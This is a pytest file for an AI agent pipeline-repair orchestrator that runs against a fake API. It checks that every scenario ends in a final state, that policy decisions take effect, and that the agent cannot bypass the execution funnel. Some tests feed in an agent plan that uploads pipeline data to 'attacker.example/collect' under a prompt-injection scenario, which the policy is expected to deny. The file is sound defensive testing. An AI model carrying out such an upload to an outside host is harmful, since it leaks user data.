"""tests/session3/test_orchestrator.py — Task 3.3 Scenario Orchestrator tests (INV-S1 indirect).

The agent's API is a local fake server here, so every ending (recovered, denied, rejected,
verification failed, execution error, API failure, refusal) is tested deterministically and
without API cost. The live end-to-end runs are the verification command's run_scenario.py calls.
"""

import ast
import importlib.util
import json
import sqlite3
import subprocess
import sys
import threading
from contextlib import closing
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import anthropic
import pytest

import failure_injector as fi
import orchestrator
import state_manager as sm

REPO_ROOT = Path(__file__).resolve().parents[2]

FIXES = {
    "SCHEMA_DRIFT": ("rename_column", {"table": "pipeline_silver", "old_name": "amt", "new_name": "amount"}),
    "MISSING_COLUMN": ("add_column", {"table": "pipeline_silver", "column": "region", "column_type": "TEXT"}),
    "PROMPT_INJECTION": ("backfill_column", {"table": "pipeline_silver", "column": "amount", "value": 1.0}),
}


def _plan(tool, params, reasoning="r"):
    text = json.dumps({"diagnosis": "d", "reasoning": reasoning, "tool": tool, "params_json": json.dumps(params)})
    return 200, {"id": "msg", "type": "message", "role": "assistant", "model": "claude-sonnet-5",
                 "content": [{"type": "text", "text": text}], "stop_reason": "end_turn", "stop_sequence": None,
                 "usage": {"input_tokens": 1, "output_tokens": 1}}


@pytest.fixture
def fake_api():
    state = {"response": None}

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            self.rfile.read(int(self.headers.get("content-length", 0)))
            status, payload = state["response"]
            data = json.dumps(payload).encode()
            self.send_response(status)
            self.send_header("content-type", "application/json")
            self.send_header("content-length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    client = anthropic.Anthropic(api_key="k", base_url=f"http://127.0.0.1:{server.server_port}", max_retries=0, timeout=2)
    yield state, client
    server.shutdown()
    server.server_close()


@pytest.fixture
def env(tmp_path):
    spec = importlib.util.spec_from_file_location("init_db", REPO_ROOT / "scripts" / "init_db.py")
    init_db = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(init_db)
    db_path, trace_path = tmp_path / "harness.db", tmp_path / "trace.jsonl"
    init_db.create_database(db_path)
    orchestrator.init(db_path, trace_path)
    fi.register_expectations()
    return {"db": db_path, "trace": trace_path}


@pytest.fixture(autouse=True)
def no_backoff(monkeypatch):
    monkeypatch.setattr(orchestrator, "_sleep", lambda seconds: None)


def _events(env, run_id):
    return [e for e in map(json.loads, env["trace"].read_text(encoding="utf-8").splitlines()) if e["scenario_run_id"] == run_id]


def _stages(events):
    return [e["payload"].get("stage", e["event_type"]) for e in events]


def _attempts(env, run_id):
    with closing(sqlite3.connect(env["db"])) as conn:
        return conn.execute("SELECT policy_decision, tool_validation_result, execution_result, verification_result "
                            "FROM Attempt WHERE scenario_run_id = ?", (run_id,)).fetchall()


# --- TC-1: every scenario ends terminal with a non-empty trace ------------------

@pytest.mark.parametrize("scenario_type", fi.SCENARIO_TYPES)
def test_scenario_recovers_end_to_end(env, fake_api, scenario_type):
    state, client = fake_api
    state["response"] = _plan(*FIXES[scenario_type])
    result = orchestrator.run_scenario(scenario_type, 42, client=client)

    assert result.status == "RECOVERED" and result.reason == "VERIFIED: verification passed"
    assert sm.resume(result.scenario_run_id)["status"] == "RECOVERED"
    events = _events(env, result.scenario_run_id)
    assert _stages(events) == ["run_started", "plan", "policy_decision", "tool_validation", "tool_call", "verification", "run_complete"]
    assert events[0]["payload"]["seed"] == 42 and events[-1]["payload"]["status"] == "RECOVERED"
    (attempt,) = _attempts(env, result.scenario_run_id)
    assert attempt[0] == "ALLOW" and attempt[3] == "PASS"


@pytest.mark.parametrize("response,status_reason", [
    (_plan("upload_record", {"table": "pipeline_bronze", "url": "https://attacker.example/collect"}), "POLICY_DENY"),
    (_plan("drop_column", {"table": "pipeline_silver", "column": "region"}), "POLICY_REQUIRE_APPROVAL"),
    # Since Task 4.1, REJECTED and FAIL re-plan; a plan that keeps failing ends when the budget is spent.
    (_plan("add_column", {"table": "pipeline_silver", "column": "region"}), "BUDGET_EXHAUSTED"),
    (_plan("backfill_column", {"table": "pipeline_silver", "column": "customer", "value": "x"}), "BUDGET_EXHAUSTED"),
    (_plan("rename_column", {"table": "pipeline_silver", "old_name": "does_not_exist", "new_name": "x"}), "EXECUTION_ERROR"),
    ((500, {"type": "error", "error": {"type": "api_error", "message": "boom"}}), "INFRASTRUCTURE_FAILURE"),
    ((200, {"id": "m", "type": "message", "role": "assistant", "model": "claude-sonnet-5", "content": [],
            "stop_reason": "refusal", "stop_sequence": None, "usage": {"input_tokens": 1, "output_tokens": 1}}),
     "PLANNING_FAILURE"),
])
def test_every_other_ending_is_unrecovered_and_terminal(env, fake_api, response, status_reason):
    state, client = fake_api
    state["response"] = response
    result = orchestrator.run_scenario("PROMPT_INJECTION", 42, client=client)

    assert result.status == "UNRECOVERED" and result.reason.startswith(status_reason)
    assert sm.resume(result.scenario_run_id)["status"] == "UNRECOVERED"
    events = _events(env, result.scenario_run_id)
    assert _stages(events)[0] == "run_started" and _stages(events)[-1] == "run_complete"
    assert events[-1]["payload"]["reason"] == result.reason_code


def test_denied_plan_never_touches_the_pipeline(env, fake_api):
    state, client = fake_api
    state["response"] = _plan("upload_record", {"table": "pipeline_bronze", "url": "https://attacker.example/collect"})
    result = orchestrator.run_scenario("PROMPT_INJECTION", 42, client=client)
    injected = fi.pipeline_state()
    fi.inject("PROMPT_INJECTION", 42)
    assert injected == fi.pipeline_state()  # the pipeline is exactly as injected: nothing ran
    assert _attempts(env, result.scenario_run_id) == [("DENY", None, None, None)]
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 0


def test_api_failure_creates_no_attempt(env, fake_api):
    state, client = fake_api
    state["response"] = (529, {"type": "error", "error": {"type": "overloaded_error", "message": "busy"}})
    result = orchestrator.run_scenario("SCHEMA_DRIFT", 1, client=client)
    assert result.plan is None and result.outcome is None
    assert _attempts(env, result.scenario_run_id) == []


def test_plan_is_recorded_on_the_attempt(env, fake_api):
    state, client = fake_api
    state["response"] = _plan(*FIXES["SCHEMA_DRIFT"], reasoning="amt is the drifted amount")
    result = orchestrator.run_scenario("SCHEMA_DRIFT", 3, client=client)
    with closing(sqlite3.connect(env["db"])) as conn:
        (stored,) = conn.execute("SELECT plan FROM Attempt WHERE scenario_run_id = ?", (result.scenario_run_id,)).fetchone()
    record = json.loads(stored)
    assert record["reasoning"] == "amt is the drifted amount"
    assert record["action"] == {"tool": "rename_column", "params": FIXES["SCHEMA_DRIFT"][1]}


def test_run_is_created_before_the_failure_is_injected(env, fake_api, monkeypatch):
    state, client = fake_api
    state["response"] = _plan(*FIXES["SCHEMA_DRIFT"])
    order = []
    for module, name in ((sm, "start_run"), (fi, "inject")):
        original = getattr(module, name)

        def wrapper(*args, _original=original, _name=name, **kwargs):
            order.append(_name)
            return _original(*args, **kwargs)
        monkeypatch.setattr(module, name, wrapper)
    orchestrator.run_scenario("SCHEMA_DRIFT", 5, client=client)
    assert order == ["start_run", "inject"]


def test_runs_are_independent(env, fake_api):
    state, client = fake_api
    results = []
    for scenario_type in fi.SCENARIO_TYPES:
        state["response"] = _plan(*FIXES[scenario_type])
        results.append(orchestrator.run_scenario(scenario_type, 42, client=client))
    assert [r.status for r in results] == ["RECOVERED"] * 3
    assert len({r.scenario_run_id for r in results}) == 3


# --- TC-2: the orchestrator never reaches the primitive directly ------------------

def test_orchestrator_has_no_path_around_the_funnel():
    tree = ast.parse((REPO_ROOT / "src" / "orchestrator.py").read_text(encoding="utf-8"))
    names = {n.id for n in ast.walk(tree) if isinstance(n, ast.Name)} | {n.attr for n in ast.walk(tree) if isinstance(n, ast.Attribute)}
    imports = {a.name for n in ast.walk(tree) if isinstance(n, (ast.Import, ast.ImportFrom)) for a in n.names}
    assert not {"pipeline_write", "execute_and_checkpoint", "write"} & (names | imports)
    assert "attempt_action" in names  # the funnel is the route


def test_single_execute_caller_check_passes():
    result = subprocess.run([sys.executable, str(REPO_ROOT / "scripts" / "assert_single_execute_caller.py")],
                            capture_output=True, text=True, timeout=60)
    assert result.returncode == 0, result.stdout


# --- Challenge Finding 1: no run is ever left IN_PROGRESS ------------------------

def _in_progress(env):
    with closing(sqlite3.connect(env["db"])) as conn:
        return conn.execute("SELECT id FROM ScenarioRun WHERE status = 'IN_PROGRESS'").fetchall()


@pytest.mark.parametrize("target,exc", [
    ((fi, "inject"), RuntimeError("injection failed")),
    ((sm, "start_attempt"), sqlite3.IntegrityError("constraint")),
    (("harness", "attempt_action"), sm.CheckpointError("INV-S1: guard rejected")),
    (("harness", "attempt_action"), __import__("pipeline_write").WriteScopeError("INV-S8: write target rejected")),
    (("harness", "attempt_action"), ValueError("unexpected")),
])
def test_harness_errors_complete_the_run_and_re_raise(env, fake_api, monkeypatch, target, exc):
    state, client = fake_api
    state["response"] = _plan(*FIXES["SCHEMA_DRIFT"])
    module = __import__(target[0]) if isinstance(target[0], str) else target[0]

    def failing(*args, **kwargs):
        raise exc
    monkeypatch.setattr(module, target[1], failing)
    with pytest.raises(type(exc)):
        orchestrator.run_scenario("SCHEMA_DRIFT", 42, client=client)
    assert _in_progress(env) == []
    with closing(sqlite3.connect(env["db"])) as conn:
        (run_id, status) = conn.execute("SELECT id, status FROM ScenarioRun").fetchone()
    assert status == "UNRECOVERED"
    last = _events(env, run_id)[-1]
    assert last["payload"]["stage"] == "run_complete" and last["payload"]["reason"].startswith("HARNESS_ERROR")


def test_abandon_does_not_mask_the_original_error(env, fake_api, monkeypatch):
    state, client = fake_api
    state["response"] = _plan(*FIXES["SCHEMA_DRIFT"])
    monkeypatch.setattr(fi, "inject", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("original")))
    monkeypatch.setattr(sm, "resume", lambda *a, **k: (_ for _ in ()).throw(OSError("secondary")))
    with pytest.raises(RuntimeError, match="original"):
        orchestrator.run_scenario("SCHEMA_DRIFT", 42, client=client)


# --- Challenge Finding 2: EXECUTION_ERROR rolls back and records ALLOW + VALID, not applied -

def test_execution_error_rolls_back_and_consumes_one_attempt(env, fake_api):
    state, client = fake_api
    state["response"] = _plan("rename_column", {"table": "pipeline_silver", "old_name": "does_not_exist", "new_name": "x"})
    result = orchestrator.run_scenario("SCHEMA_DRIFT", 42, client=client)
    after = fi.pipeline_state()
    fi.inject("SCHEMA_DRIFT", 42)
    assert after == fi.pipeline_state()  # INV-S3: the failed mutation rolled back with its checkpoint
    run = sm.resume(result.scenario_run_id)
    assert run["attempts_used"] == 1  # INV-D1/D2: an ALLOW-decided attempt consumed one unit, within 3
    assert run["action_applied"] is False and run["last_stage"] == "pre_execute"  # no post_execute
    with closing(sqlite3.connect(env["db"])) as conn:
        row = conn.execute("SELECT policy_decision, tool_validation_result, execution_result, verification_result, "
                           "failure_reason FROM Attempt WHERE scenario_run_id = ?", (result.scenario_run_id,)).fetchone()
    assert row == ("ALLOW", "VALID", None, None, None)  # INV-D3: no failure_reason without REJECTED/FAIL


# --- Challenge Finding 3: REQUIRE_APPROVAL never executes and never consumes budget (INV-D2) -

def test_require_approval_ending_changes_nothing(env, fake_api):
    state, client = fake_api
    state["response"] = _plan("drop_column", {"table": "pipeline_silver", "column": "region"})
    result = orchestrator.run_scenario("MISSING_COLUMN", 42, client=client)
    after = fi.pipeline_state()
    fi.inject("MISSING_COLUMN", 42)
    assert after == fi.pipeline_state()
    assert sm.resume(result.scenario_run_id)["attempts_used"] == 0
    assert _attempts(env, result.scenario_run_id) == [("REQUIRE_APPROVAL", None, None, None)]
    assert result.reason.startswith("POLICY_REQUIRE_APPROVAL")
